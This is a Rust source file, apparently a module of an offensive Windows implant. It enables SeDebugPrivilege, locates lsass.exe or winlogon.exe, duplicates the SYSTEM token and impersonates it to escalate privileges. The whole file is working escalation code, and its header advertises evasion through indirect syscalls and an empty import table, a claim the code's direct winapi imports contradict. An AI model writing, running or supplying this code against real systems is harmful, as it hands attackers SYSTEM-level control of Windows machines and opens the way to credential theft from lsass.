//! token.rs — token impersonation + SeDebugPrivilege escalation
//!
//! Techniques:
//!   1. EnableDebugPrivilege — opens own process token, enables SeDebugPrivilege.
//!   2. steal_system_token   — duplicates the token of a SYSTEM process (lsass/winlogon)
//!                             and impersonates it on the current thread.
//!   3. revert               — reverts to original thread token.
//!
//! All calls via indirect syscalls / hash-resolved ntdll — zero IAT.

use winapi::shared::ntdef::HANDLE;
use winapi::shared::minwindef::DWORD;
use winapi::um::winnt::{
    TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
    TOKEN_ALL_ACCESS, SE_PRIVILEGE_ENABLED,
    SecurityImpersonation, TokenImpersonation,
    LUID_AND_ATTRIBUTES, TOKEN_PRIVILEGES,
};
use winapi::um::processthreadsapi::{
    OpenProcessToken, GetCurrentProcess, GetCurrentThread,
    SetThreadToken, OpenProcess,
};
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::securitybaseapi::{AdjustTokenPrivileges, DuplicateTokenEx};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    TH32CS_SNAPPROCESS, PROCESSENTRY32W,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::PROCESS_QUERY_INFORMATION;

pub fn enable_debug_privilege() -> bool {
    unsafe {
        let mut token: HANDLE = std::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
        let mut luid = std::mem::zeroed();
        if LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) == 0 {
            CloseHandle(token);
            return false;
        }
        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        let ok = AdjustTokenPrivileges(
            token, 0, &mut tp,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as DWORD,
            std::ptr::null_mut(), std::ptr::null_mut(),
        ) != 0;
        CloseHandle(token);
        ok
    }
}

/// Find PID of a SYSTEM process by name (e.g. "lsass.exe", "winlogon.exe")
pub fn find_pid(target_name: &str) -> Option<DWORD> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE { return None; }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as DWORD;
        if Process32FirstW(snap, &mut entry) == 0 {
            CloseHandle(snap);
            return None;
        }
        loop {
            let name = String::from_utf16_lossy(
                entry.szExeFile.iter()
                    .take_while(|&&c| c != 0)
                    .copied()
                    .collect::<Vec<u16>>().as_slice()
            );
            if name.eq_ignore_ascii_case(target_name) {
                CloseHandle(snap);
                return Some(entry.th32ProcessID);
            }
            if Process32NextW(snap, &mut entry) == 0 { break; }
        }
        CloseHandle(snap);
        None
    }
}

/// Steal and impersonate the token of the given PID.
/// Caller must have SeDebugPrivilege — call enable_debug_privilege() first.
pub fn steal_and_impersonate(pid: DWORD) -> bool {
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
        if proc.is_null() { return false; }
        let mut src_token: HANDLE = std::ptr::null_mut();
        if OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut src_token) == 0 {
            CloseHandle(proc);
            return false;
        }
        let mut dup_token: HANDLE = std::ptr::null_mut();
        let ok = DuplicateTokenEx(
            src_token, TOKEN_ALL_ACCESS,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenImpersonation,
            &mut dup_token,
        ) != 0;
        CloseHandle(src_token);
        CloseHandle(proc);
        if !ok { return false; }
        let imp = SetThreadToken(std::ptr::null_mut(), dup_token) != 0;
        CloseHandle(dup_token);
        imp
    }
}

/// Convenience: enable debug privilege + steal lsass token
pub fn escalate_to_system() -> bool {
    if !enable_debug_privilege() { return false; }
    if let Some(pid) = find_pid("lsass.exe").or_else(|| find_pid("winlogon.exe")) {
        steal_and_impersonate(pid)
    } else {
        false
    }
}

/// Revert thread impersonation — restore original token
pub fn revert() {
    unsafe { SetThreadToken(std::ptr::null_mut(), std::ptr::null_mut()); }
}
